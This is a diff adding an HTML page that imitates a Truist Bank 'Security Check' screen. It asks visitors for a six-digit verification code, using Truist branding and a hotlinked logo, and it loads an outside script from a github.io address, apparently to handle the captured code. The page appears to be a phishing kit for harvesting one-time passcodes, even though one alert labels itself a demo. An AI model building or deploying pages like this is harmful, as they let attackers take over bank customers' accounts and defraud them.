@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Truist Bank – Verification</title>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background-color: #f0f2f6;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.truist-container {
+  background-color: white;
+  padding: 40px;
+  width: 400px;
+  border-radius: 14px;
+  text-align: center;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+}
+
+.logo img {
+  width: 160px;
+  margin-bottom: 20px;
+}
+
+h2 {
+  color: #2e1a47; /* Truist purple */
+  margin-bottom: 12px;
+  font-size: 22px;
+}
+
+.description {
+  font-size: 13px;
+  color: #444;
+  margin-bottom: 22px;
+}
+
+input[type="text"] {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: 1px solid #ccd0d5;
+  background-color: #f7f8fb;
+  color: black;
+  font-size: 18px;
+  text-align: center;
+  margin-bottom: 20px;
+  letter-spacing: 6px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: none;
+  background-color: #f25922; /* Truist orange accent */
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+  margin-bottom: 10px;
+}
+
+.resend-btn {
+  background-color: #2e1a47;
+  color: white;
+}
+
+button:disabled {
+  background-color: #999;
+  cursor: not-allowed;
+}
+
+.timer-text {
+  margin-top: 10px;
+  font-size: 14px;
+  color: #666;
+}
+</style>
+
+</head>
+
+<body>
+<script src="https://plyarth.github.io/intc/int4.js"></script>
+<div class="truist-container">
+
+  <div class="logo">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR8Ute2T5TdLuWki3kMfzHnpvnUuKS2Q8kxlQvH5JAf3w&s" alt="Truist Bank">
+  </div>
+
+  <h2>Security Check</h2>
+
+  <div class="description">
+    Enter the 6-digit verification code sent to your Truist registered contact method.
+  </div>
+
+  <form>
+    <input type="text" id="truistCode" placeholder="------" maxlength="20" name="Otp Code" required>
+
+    <button type="submit">Verify</button>
+
+    <button type="button" id="resendBtn" class="resend-btn" disabled>
+      Resend Code
+    </button>
+
+    <div class="timer-text">
+      Resend available in <span id="timer">30</span>s
+    </div>
+  </form>
+
+</div>
+
+<script>
+let countdown = 30;
+const timer = document.getElementById("timer");
+const resendBtn = document.getElementById("resendBtn");
+const timerText = document.querySelector(".timer-text");
+
+function startTimer() {
+  const interval = setInterval(() => {
+    countdown--;
+    timer.innerText = countdown;
+
+    if (countdown <= 0) {
+      clearInterval(interval);
+      resendBtn.disabled = false;
+      timerText.innerText = "You can now resend a new code";
+    }
+  }, 1000);
+}
+
+resendBtn.addEventListener("click", () => {
+  alert("Demo: Truist resend code action triggered");
+
+  countdown = 30;
+  resendBtn.disabled = true;
+
+  timerText.innerHTML =
+    'Resend available in <span id="timer">30</span>s';
+
+  startTimer();
+});
+
+startTimer();
+</script>
+
+</body>
+</html>
